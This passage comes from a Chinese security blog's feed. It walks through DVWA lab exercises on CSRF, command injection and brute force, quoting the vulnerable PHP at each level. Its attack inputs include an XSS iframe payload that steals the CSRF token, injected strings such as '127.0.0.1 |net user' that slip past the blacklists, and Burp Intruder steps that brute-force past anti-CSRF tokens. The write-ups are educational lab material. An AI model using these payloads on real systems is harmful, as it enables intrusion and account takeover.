中的链接。<br>7.浏览器未加设置或被用户修改。</p></blockquote><p>所以一般来说，只有通过 &lt; a&gt;&lt;/ a&gt; 超链接，以及POST或GET表单访问的页面，$_SERVER[‘HTTP_REFERER’] 才有效。</p><p>假设服务器地址是172.25.100.100，那么在提交http请求的referer中也必须出现这个地址字符串。<br>既然是字符串匹配，那就简单了，只需要把上面test.html改为172.25.100.100.html，然后放入自己伪装的网站就行了。反正只要referer字符串中有172.25.100.100就成功了。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码审计</p><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p>多了 checkToken，那么如何获得token就是关键了，我们可以尝试在dvwa中提交一下，可以看到URL如下</p><pre><code class="php">http://172.25.100.100/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change&amp;user_token=2acfea0dbe4dcb19e2a1843319f66e88#</code></pre><p>dvwa的high级别XSS攻击防御中，只是屏蔽了&lt; script&gt;标签，其他标签依然有效。<br>所以，此时在浏览器中输入以下URL</p><pre><code class="php">http://172.25.100.100/vulnerabilities/xss_r/?name=%3Ciframe+src%3D%22..%2Fcsrf%2F%22+onload%3Dalert%28frames[0].document.getElementsByName%28%27user_token%27%29[0].value%29%3E#</code></pre><p><img src="https://img-blog.csdnimg.cn/2020112315084497.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>获得了token后，剩下同上</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码审计</p><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $pass_curr = $_GET[ &#39;password_current&#39; ];    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Sanitise current password input    $pass_curr = stripslashes( $pass_curr );    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $pass_curr = md5( $pass_curr );    // Check that the current password is correct    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );    $data-&gt;execute();    // Do both new passwords match and does the current password match the user?    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;        // It does!        $pass_new = stripslashes( $pass_new );        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update database with new password        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;execute();        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p><img src="https://img-blog.csdnimg.cn/20201123151005705.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>多了一个现在的密码</p><p>如果攻击者不知道现在的密码，是不能修改密码的。</p><p><a href="https://blog.csdn.net/weixin_42555985/article/details/88533752?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160610502719725225022515%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160610502719725225022515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-3-88533752.pc_search_result_cache&utm_term=DVWA%20%20Cross%20Site%20Request%20Forge&spm=1018.2118.3001.4449">参考链接</a></p><p><a href="https://blog.csdn.net/qycc3391/article/details/104741756?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160610502719725225022515%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160610502719725225022515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-4-104741756.pc_search_result_cache&utm_term=DVWA%20%20Cross%20Site%20Request%20Forge&spm=1018.2118.3001.4449">学习csrf</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA--Command Injection</title>
      <link href="2020/11/23/DVWA-Command-Injection/"/>
      <url>2020/11/23/DVWA-Command-Injection/</url>
      
        <content type="html"><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>命令注入（Command Injection），对一些函数的参数没有做过滤或过滤不严导致的，可以执行系统或者应用指令（CMD命令或者bash命令）的一种注入攻击手段。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。</p><p>命令执行漏洞的原理：在操作系统中， &amp;  、&amp;&amp; 、|  、 ||   都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p><pre><code class="php">&amp;&amp;:前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样||:前一个命令执行失败，后面的才继续执行，类似于或操作&amp;：不管前一个命令有没有执行，后面一个命令都会执行|：管道符，将前一个命令的输出作为下一个命令的输入;：直接连接多个命令</code></pre><p>代码审计</p><pre><code class="python">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; </code></pre><p>发现并没有任何的过滤<br>使用命令:127.0.0.1 &amp;&amp; net user 就可以得到账户用户</p><p>其他的：127.0.0.2||net user (用错误的ip)；127.0.0.1&amp;net user；127.0.0.1|net user</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>采用黑名单机制，但过滤不谨慎，仅仅过滤了’&amp;&amp;’ ‘;’</p><p>127.0.0.1&amp;;&amp;net user</p><p>127.0.0.2&amp;net user</p><p>127.0.0.1||net user</p><p>127.0.0.1|net user</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>还是采用黑名单机制，但依旧过滤不谨慎</p><pre><code class="php">$substitutions = array(     &#39;&amp;&#39;  =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;,      &#39;|  &#39; =&gt; &#39;&#39;,     &#39;-&#39;  =&gt; &#39;&#39;,     &#39;$&#39;  =&gt; &#39;&#39;,    &#39;(&#39;  =&gt; &#39;&#39;,     &#39;)&#39;  =&gt; &#39;&#39;,      &#39;`&#39;  =&gt; &#39;&#39;,       &#39;||&#39; =&gt; &#39;&#39;,    ); </code></pre><p>‘| ’ =&gt; ‘’, 这个过滤出了问题</p><p>| 的后面紧跟着空格<br>127.0.0.1 |dir；127.0.0.1 |net user只要正常|后面不带空格就好</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>stripslashes(string)</p><p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p>explode(separator,string,limit)</p><p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p><p>is_numeric(string)</p><p>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p><p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p><p>参考链接：<a href="https://www.freebuf.com/articles/web/116714.html">https://www.freebuf.com/articles/web/116714.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA--Brute Force</title>
      <link href="2020/11/23/DVWA-Brute-Force/"/>
      <url>2020/11/23/DVWA-Brute-Force/</url>
      
        <content type="html"><![CDATA[<h2 id="LOW："><a href="#LOW：" class="headerlink" title="LOW："></a>LOW：</h2><p>Brute Force，即暴力，是指利用密码字典，穷举法破解用户密码口令。</p><p>暴力的话，burp suite就行</p><p>找到搭建时候的源码，看下有无过滤（偷懒）</p><pre><code class="python">&lt;?phpif( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;    // Get username    $user = $_GET[ &#39;username&#39; ];    // Get password    $pass = $_GET[ &#39;password&#39; ];    $pass = md5( $pass );    // Check the database    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[&quot;avatar&quot;];        // Login successful        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;    &#125;    else &#123;        // Login failed        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; </code></pre><p>看到，验证了参数Login是否被设置，对参数username没有做任何过滤，这里可以sql注入；密码做了md5加密，不能注入</p><p>bp抓包</p><p><img src="https://img-blog.csdnimg.cn/20201123111355546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发送到Intruder模块爆破</p><p>设置变量模式</p><p><em>Sniper标签 ，这个模式会使用单一的payload组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。<br>Battering ram ，这个模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中<br>Pitchfork ，这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量<br>Cluster bomb ， 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</em></p><p>在Position中的Attack type选择cluster boomb，clear其它的爆破项，add用户名和密码两个字段进行爆破</p><p><img src="https://img-blog.csdnimg.cn/20201123112043550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>在Payloads中为两个字段设置字典，在Options中可以设置线程，Attack开始</p><p><img src="https://img-blog.csdnimg.cn/20201123112242222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>点击Length排序，比较长度，发现密码</p><p><img src="https://img-blog.csdnimg.cn/20201123112410579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><p>代码审计</p><pre><code class="python">&lt;?phpif( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;    // Sanitise username input    $user = $_GET[ &#39;username&#39; ];    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitise password input    $pass = $_GET[ &#39;password&#39; ];    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $pass = md5( $pass );    // Check the database    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[&quot;avatar&quot;];        // Login successful        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;    &#125;    else &#123;        // Login failed        sleep( 2 );        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; </code></pre><p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击(宽字节注入可以搞定)</p><p>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交，等于爆破时间延长</p><p>意味着前面有提到的sql注入就不行了，但是bp爆破还是可以，同上</p><h2 id="HIIGH"><a href="#HIIGH" class="headerlink" title="HIIGH"></a>HIIGH</h2><p>代码审计</p><pre><code class="python"> &lt;?phpif( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Sanitise username input    $user = $_GET[ &#39;username&#39; ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitise password input    $pass = $_GET[ &#39;password&#39; ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $pass = md5( $pass );    // Check database    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[&quot;avatar&quot;];        // Login successful        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;    &#125;    else &#123;        // Login failed        sleep( rand( 0, 3 ) );        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>stripslashes(string)： 去除掉string字符的反斜杠＼</p><p>mysqli_real_escape_string(string,connection) ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p><p>$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>High级别的代码使用了Anti-CSRF token来抵御CSRF的攻击，使用了stripslashes函数和mysqli_real_esacpe_string来抵御SQL注入和XSS的攻击。</p><p>由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，我们不能再利用burpsuite进行无脑式的爆破了</p><p>可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。</p><p><img src="https://img-blog.csdnimg.cn/20201123113028325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还是bp抓包发送到Intruder，将Attack type设置为pitch fork，为password值和user_token值添加payload标志，在options栏找到Grep - Extract，点击Add。然后点击Refetch response，进行一个请求，即可看到响应报文，直接选取需要提取的字符串，上面的会自动填入数据的起始和结束标识，并将此值保存下来，点击“OK”返回，可以在列表中看到一个grep项。将Request Engine中的Number of threads改为1。返回payloads栏，payload 1 设置密码字典，payload 2 选择payload type为“Recursive grep”，然后选择下面的extract grep项即可。将刚刚保存的值填到起始值， 然后，从Results中可以看到上一次访问得到的token作为了本次请求的参数。而且从响应信息上也可以看到，没有提示token错误。长度不一样的password即为密码。</p><p><img src="https://img-blog.csdnimg.cn/20201123113407816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201123113413831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201123113423581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201123113432550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201123113436724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h2><p>代码审计</p><pre><code class="python">&lt;?phpif( isset( $_POST[ &#39;Login&#39; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Sanitise username input    $user = $_POST[ &#39;username&#39; ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitise password input    $pass = $_POST[ &#39;password&#39; ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $pass = md5( $pass );    // Default values    $total_failed_login = 3;    $lockout_time       = 15;    $account_locked     = false;    // Check the database (Check user information)    $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );    $data-&gt;execute();    $row = $data-&gt;fetch();    // Check to see if the user has been locked out.    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  &#123;        // User locked out.  Note, using this method would allow for user enumeration!        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;        // Calculate when the user would be allowed to login again        $last_login = strtotime( $row[ &#39;last_login&#39; ] );        $timeout    = $last_login + ($lockout_time * 60);        $timenow    = time();        /*        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;        */        // Check to see if enough time has passed, if it hasn&#39;t locked the account        if( $timenow &lt; $timeout ) &#123;            $account_locked = true;            // print &quot;The account is locked&lt;br /&gt;&quot;;        &#125;    &#125;    // Check the database (if username matches the password)    $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);    $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );    $data-&gt;execute();    $row = $data-&gt;fetch();    // If its a valid login...    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;        // Get users details        $avatar       = $row[ &#39;avatar&#39; ];        $failed_login = $row[ &#39;failed_login&#39; ];        $last_login   = $row[ &#39;last_login&#39; ];        // Login successful        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;        // Had the account been locked out since last login?        if( $failed_login &gt;= $total_failed_login ) &#123;            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;        &#125;        // Reset bad login count        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );        $data-&gt;execute();    &#125; else &#123;        // Login failed        sleep( rand( 2, 4 ) );        // Give the user some feedback        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;        // Update bad login count        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );        $data-&gt;execute();    &#125;    // Set the last login time    $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );    $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p><p><img 